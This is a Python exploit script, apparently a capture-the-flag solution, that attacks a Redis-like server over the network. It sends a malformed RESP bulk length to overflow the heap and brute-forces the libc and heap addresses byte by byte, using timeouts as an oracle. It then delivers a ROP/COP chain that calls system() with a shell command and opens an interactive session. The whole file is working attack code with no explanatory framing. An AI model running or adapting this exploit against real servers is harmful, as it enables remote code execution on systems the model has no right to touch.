import os
import time
from ptrlib import *

def R(data):
    if isinstance(data, int):
        return f":{data}\r\n".encode()
    elif isinstance(data, str):
        return f"${len(data)}\r\n{data}\r\n".encode()
    elif isinstance(data, bytes):
        return f"${len(data)}\r\n".encode() + data + b"\r\n"
    elif isinstance(data, list):
        return f"*{len(data)}\r\n".encode() + b''.join([R(elm) for elm in data])
    else:
        raise ValueError(f"Non-RESP type: {type(data)}")

def redis_recv():
    t = sock.recvonce(1)
    if t == b'+' or t == b'-':
        return sock.recvuntil("\r\n")[:-2]
    elif t == b':':
        return int(sock.recvuntil("\r\n")[:-2])
    elif t == b'$':
        s = int(sock.recvuntil("\r\n")[:-2])
        if s == -1:
            return None
        d = sock.recvonce(s)
        sock.recvuntil("\r\n")
        return d
    elif t == b'*':
        s = int(sock.recvuntil("\r\n")[:-2])
        return [redis_recv() for i in range(s)]
    else:
        raise ValueError(f"What is this? {t}")

def redis_set(key, value, timeout=None):
    if timeout:
        sock.send(R(["SET", key, value, "PX", timeout]))
    else:
        sock.send(R(["SET", key, value]))
    return redis_recv()
def redis_get(key):
    sock.send(R(["GET", key]))
    return redis_recv()
def redis_copy(src, dst):
    sock.send(R(["COPY", src, dst]))
    return redis_recv()
def redis_rename(src, dst):
    sock.send(R(["RENAME", src, dst]))
    return redis_recv()
def redis_del(key):
    sock.send(R(["DEL", key]))
    return redis_recv()
def redis_exists(key):
    sock.send(R(["EXISTS", key]))
    return redis_recv()
def redis_type(key):
    sock.send(R(["TYPE", key]))
    return redis_recv()
def redis_echo(msg):
    sock.send(R(["ECHO", msg]))
    return redis_recv()

logger.level = 0

CMD = "/bin/ls -lha;"

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "12345")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

"""
1. Leak libc base
"""
target = libc.symbol('usleep')
#"""
leak = bytes([target & 0xff])
for i in range(len(leak), 6):
    for c in range(0, 0x100):
        if i == 1 and c & 0xf != (target >> 8) & 0xf:
            continue
        sock = Socket(HOST, int(PORT))
        redis_set(1, 1, timeout=3000)
        redis_set(777, 777, timeout=100)
        redis_set(2, 2, timeout=3000)

        payload  = b'A'*0x20
        payload += leak
        payload += bytes([c])
        sock.send(b"$-3\r\n" + payload)
        try:
            if len(sock.recv(timeout=0.5)) == 0:
                sock.close()
                continue
        except TimeoutError:
            sock.close()
            print(f"Found: 0x{c:02x}")
            leak += bytes([c])
            break

    else:
        print("Bad luck!")
        exit(1)
"""
leak = p64(0x7ffff7e9b840)
#"""
libc_base = u64(leak) - libc.symbol('usleep')
print("libc: " + hex(libc_base))
libc.set_base(libc_base)

rop_ret = libc_base + 0x000469da

"""
2. Leak heap address
"""
#"""
leak = b""
for i in range(len(leak), 6):
    for c in range(0, 0x100):
        sock = Socket(HOST, int(PORT))
        redis_set(1, 1, timeout=300)
        redis_set(777, 777, timeout=100)
        redis_set(2, 2, timeout=300)
        payload  = b'A'*0x18 + p64(0x21)
        payload += p64(rop_ret)
        payload += p32(1) + p32(1)
        payload += leak
        payload += bytes([c])
        sock.send(b"$-3\r\n" + payload)
        try:
            if len(sock.recv(timeout=0.5)) == 0:
                continue
        except TimeoutError:
            print(f"Found: 0x{c:02x}")
            leak += bytes([c])
            break
"""
leak = p64(0x55555555e800)
#"""
heap_base = u64(leak) & ~0xfff
print("heap: " + hex(heap_base))

"""
3. Run COP chain
"""
rop_mov_rdi_prbpP18h_mov_rsi_prspP28h_lea_rcx_prbpP28h_mov_edx_1_call_prbpP40h = libc_base + 0x00110390
rop_pop_rax_mov_rdi_rbx_call_prbpP60h = libc_base + 0x000823ef

sock = Socket(HOST, int(PORT))

redis_set(1, 1, timeout=1000)
redis_set(777, 777, timeout=300)
redis_set(2, 2, timeout=1000)
payload  = b'A'*0x20
payload += p64(rop_pop_rax_mov_rdi_rbx_call_prbpP60h + 1) # skip pop actually
payload += b'A'*0x10
payload += p64(heap_base + 0x738)
payload += b'A'*0x20
payload += p64(libc.symbol("system"))
payload += b'A'*0x18
payload += p64(rop_mov_rdi_prbpP18h_mov_rsi_prspP28h_lea_rcx_prbpP28h_mov_edx_1_call_prbpP40h)
payload += CMD.encode()
sock.send(b"$-3\r\n" + payload)

sock.interactive()
